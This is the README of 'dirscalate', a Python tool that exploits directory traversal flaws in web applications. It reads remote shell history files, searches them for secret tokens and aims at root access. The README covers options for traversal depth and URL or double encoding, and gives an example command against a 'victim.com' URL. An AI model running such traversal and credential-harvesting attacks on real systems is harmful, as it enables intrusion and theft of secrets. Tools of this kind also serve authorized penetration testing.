dirscalate
==========

Dirscalate helps escalate a directory traversal vulnerability to root access (hopefully)

Requirements
============
Mechanize

Usage
=====

dirscalate.py [-h] --link LINK [--histfile HISTFILE] 
                       [--tokens TOKENS] [--logfile LOGFILE] 
                       [--depth DEPTH] [--type TYPE]

  Exploit a directory traversal vulnerability to find sensitive information

  optional arguments:
  
    -h, --help           show this help message and exit
    --link LINK          the full URL to exploit, replace value in vulnerable
                         parameter with #vulnerability# marker (must include
                         http(s):// (default: None)
    --histfile HISTFILE  the list of history files to search (default:
                         histfile.txt)
    --tokens TOKENS      the list of strings to search for in the history 
                         files (default: tokens.txt)
    --logfile LOGFILE    the logfile to write matches to (default:
                         dirscalate.txt)
    --depth DEPTH        the length of the traversal attempt (default: 10)
    --type TYPE          1 (../), 2 (URL encoded), or 3 (double encoded)
                         (default: 1)

  Example: dirscalate.py --link 
    https://www.victim.com/login.php?test=1&blah=#vulnerability#&id=2 
    --histfile histfile.txt --tokens tokens.txt --depth 10 --type standard
